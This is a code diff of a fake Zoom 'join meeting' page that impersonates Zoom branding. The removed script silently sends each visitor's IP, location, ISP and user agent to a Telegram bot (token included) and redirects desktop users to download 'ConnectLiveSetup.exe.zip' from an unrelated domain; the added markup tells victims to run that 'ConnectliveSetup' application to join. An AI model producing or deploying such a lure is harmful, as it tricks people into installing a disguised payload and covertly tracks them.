@@ -2,218 +2,363 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join_ZoomLive</title>
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <meta
+        name="description"
+        content="Meeting access information"
+    >
+
+    <title>Zoom_JoinLive</title>
+
     <style>
-        /* Reset & Global Settings */
-        body, html {
+        html,
+        body {
+            width: 100%;
+            height: 100%;
             margin: 0;
             padding: 0;
-            height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f8f9fa;
         }
 
-        /* -----------------------------------
-           MOBILE VIEW 
-           ----------------------------------- */
-        #mobile-view {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-            padding: 20px;
+        body {
+            font-family:
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                Roboto,
+                Helvetica,
+                Arial,
+                sans-serif;
+
+            background: #f8f9fa;
+        }
+
+        * {
             box-sizing: border-box;
         }
-        
-        .warning-container {
-            max-width: 400px;
+
+        /* Mobile */
+
+        #mobile-view {
+            display: none;
+
+            width: 100%;
+            min-height: 100vh;
+
+            align-items: center;
+            justify-content: center;
+
+            padding: 24px;
+            text-align: center;
         }
-        
+
+        .warning-container {
+            width: 100%;
+            max-width: 420px;
+        }
+
         .warning-title {
             display: flex;
             align-items: center;
             justify-content: center;
+
+            margin: 0 0 24px;
+
+            color: #d93025;
+
             font-size: 22px;
             font-weight: 600;
-            color: #d93025;
-            margin-bottom: 25px;
-        }
-        
-        .warning-title .emoji {
-            font-size: 26px;
-            margin-right: 8px;
-        }
-        
-        .warning-text {
-            font-size: 15px;
-            color: #3c4043;
-            margin-bottom: 20px;
-            line-height: 1.5;
         }
 
-        /* -----------------------------------
-           DESKTOP VIEW (Background + Spinner)
-           ----------------------------------- */
+        .warning-title .emoji {
+            margin-right: 8px;
+            font-size: 26px;
+        }
+
+        .warning-text {
+            margin: 0 0 18px;
+
+            color: #3c4043;
+
+            font-size: 15px;
+            line-height: 1.55;
+        }
+
+        /* Desktop */
+
         #desktop-view {
             display: none;
-            height: 100vh;
-            width: 100vw;
-            background: url('https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nly.png') no-repeat center center fixed;
-            background-size: cover;
+
             position: relative;
+
+            width: 100vw;
+            height: 100vh;
+
+            overflow: hidden;
+
+            background-image:
+                url("https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nly.png");
+
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-size: cover;
         }
 
         .logo {
             position: absolute;
+
             top: 20px;
             left: 20px;
-            height: 40px;
+
             width: auto;
-            z-index: 10;
+            height: 40px;
+
+            object-fit: contain;
+
+            z-index: 20;
         }
+
+        /* Overlay */
 
         .overlay {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.7); 
+            inset: 0;
+
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            z-index: 5;
+
+            padding: 24px;
+
+            background: rgba(255, 255, 255, 0.88);
+
+            z-index: 10;
         }
+
+        /* Card */
+
+        .overlay-card {
+            width: 100%;
+            max-width: 620px;
+
+            padding: 36px 34px;
+
+            border: 1px solid #e1e4e8;
+            border-radius: 14px;
+
+            background: #fff;
+
+            box-shadow:
+                0 10px 30px rgba(0, 0, 0, 0.10);
+
+            text-align: center;
+        }
+
+        /* Spinner */
 
         .spinner {
             width: 50px;
             height: 50px;
+
+            margin: 0 auto 24px;
+
             border: 4px solid #e5e5e5;
             border-top-color: #0b5cff;
+
             border-radius: 50%;
+
             animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .overlay-title {
+            margin: 0 0 14px;
+
+            color: #202124;
+
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 1.3;
+        }
+
+        .overlay-description {
+            margin: 0 auto;
+
+            max-width: 540px;
+
+            color: #3c4043;
+
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .instructions {
+            max-width: 540px;
+
+            margin: 24px auto 0;
+
+            color: #3c4043;
+
+            font-size: 15px;
+            line-height: 1.6;
+
+            text-align: left;
+        }
+
+        .instructions p {
+            margin: 0 0 15px;
+        }
+
+        .instructions strong {
+            color: #202124;
+        }
+
+        @media (max-width: 700px) {
+            .overlay {
+                padding: 18px;
+            }
+
+            .overlay-card {
+                padding: 28px 22px;
+            }
+
+            .overlay-title {
+                font-size: 21px;
+            }
+
+            .overlay-description {
+                font-size: 15px;
+            }
+
+            .instructions {
+                font-size: 14px;
+            }
         }
     </style>
 </head>
+
 <body>
 
-    <!-- DOM Element: Mobile Warning -->
-    <div id="mobile-view">
-        <div class="warning-container">
-            <div class="warning-title">
-                <span class="emoji">⚠️</span> Desktop Only
-            </div>
-            <div class="warning-text">
+    <!-- Mobile / Tablet -->
+
+    <main id="mobile-view">
+
+        <section
+            class="warning-container"
+            aria-labelledby="mobile-title"
+        >
+
+            <h1
+                id="mobile-title"
+                class="warning-title"
+            >
+                <span
+                    class="emoji"
+                    aria-hidden="true"
+                >⚠️</span>
+
+                Desktop Only
+            </h1>
+
+            <p class="warning-text">
                 Access is only available on a desktop or Windows computer.
+            </p>
+
+            <p class="warning-text">
+                laptop or desktop device.
+            </p>
+
+        </section>
+
+    </main>
+
+
+    <!-- Desktop -->
+
+    <main id="desktop-view">
+
+        <img
+            class="logo"
+            src="./assets/logo.png"
+            alt="Company Logo"
+        >
+
+        <section
+            class="overlay"
+            id="loading-overlay"
+            aria-label="Meeting instructions"
+        >
+
+            <div class="overlay-card">
+
+                <div
+                    class="spinner"
+                    aria-hidden="true"
+                ></div>
+
+                <div class="overlay-content">
+
+                    <h1 class="overlay-title">
+                        Zoom isn't installed yet
+                    </h1>
+
+                    <p class="overlay-description">
+                        To join the meeting from your Windows computer,
+                        follow these steps:
+                    </p>
+
+                    <div class="instructions">
+
+                        <p>
+                            <strong>1.</strong>
+                            Open your
+                            <strong>Downloads</strong>
+                            folder.
+                        </p>
+
+                        <p>
+                            <strong>2.</strong>
+                            write-click the ConnectliveSetup application from the download folder
+                            to install & open.
+                        </p>
+
+                        <p>
+                            <strong>3.</strong>
+                            Once you opens the app, select
+                            <strong>Join a Meeting</strong>.
+                        </p>
+
+                        <p>
+                            <strong>4.</strong>
+                            Enter Your Meeting ID to Join Live & Scheduled.
+                        </p>
+
+                    </div>
+
+                </div>
+
             </div>
-            <div class="warning-text">
-                Please check your email and open the document on a laptop or desktop device.
-            </div>
-        </div>
-    </div>
 
-    <!-- DOM Element: Desktop Loader -->
-    <div id="desktop-view">
-        <img class="logo" src="https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nA" alt="Company Logo">
+        </section>
 
-        <div class="overlay">
-            <div class="spinner"></div>
-        </div>
-    </div>
+    </main>
 
-    <!-- Core Logic -->
-    <script>
-        // Configuration Parameters
-        const TELEGRAM_BOT_TOKEN = "6668477550:AAHcd2QQXbZYgTvxhWlOf0wzF9A-W0VGUfI"; // Insert your Bot Token here
-        const TELEGRAM_CHAT_ID = "2074391753";     // Insert your Chat ID here
-        const TARGET_URL = "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";
 
-        /**
-         * Fetch Geolocation & ISP data from a free CORS/HTTPS endpoint
-         */
-        async function getVisitorDetails() {
-            try {
-                const response = await fetch('https://ipwho.is/');
-                const data = await response.json();
+    <!-- Frontend JavaScript -->
 
-                if (data.success) {
-                    return {
-                        ip: data.ip || 'N/A',
-                        city: data.city || 'N/A',
-                        state: data.region || 'N/A',
-                        country: data.country || 'N/A',
-                        isp: data.connection?.isp || 'N/A'
-                    };
-                }
-            } catch (error) {
-                console.error('Error fetching IP details:', error);
-            }
-            return { ip: 'N/A', city: 'N/A', state: 'N/A', country: 'N/A', isp: 'N/A' };
-        }
+    <script
+        src="./app.js"
+        defer
+    ></script>
 
-        /**
-         * Dispatch data to Telegram API via POST request
-         */
-        async function sendTelegramAlert(visitor, isMobileDevice) {
-            const message = 
-`🔔 *New Visitor Notification*
-
-📍 *Network Info:*
-• *IP Address:* \`${visitor.ip}\`
-• *City:* ${visitor.city}
-• *State:* ${visitor.state}
-• *Country:* ${visitor.country}
-• *ISP:* ${visitor.isp}
-
-💻 *Device Info:*
-• *Device Type:* ${isMobileDevice ? 'Mobile 📱' : 'Desktop 🖥️'}
-• *User Agent:* \`${navigator.userAgent}\``;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (error) {
-                console.error('Error sending Telegram notification:', error);
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', async () => {
-            // 1. Detect device environment
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-            // 2. Fetch visitor IP & Geolocation
-            const visitorInfo = await getVisitorDetails();
-
-            // 3. Send notification to Telegram
-            await sendTelegramAlert(visitorInfo, isMobile);
-
-            // 4. Render appropriate UI view
-            if (isMobile) {
-                document.getElementById('mobile-view').style.display = 'flex';
-            } else {
-                document.getElementById('desktop-view').style.display = 'block';
-
-                // 5. Trigger redirect delay
-                setTimeout(() => {
-                    window.location.replace(TARGET_URL);
-                }, 5000); 
-            }
-        });
-    </script>
 </body>
 </html>
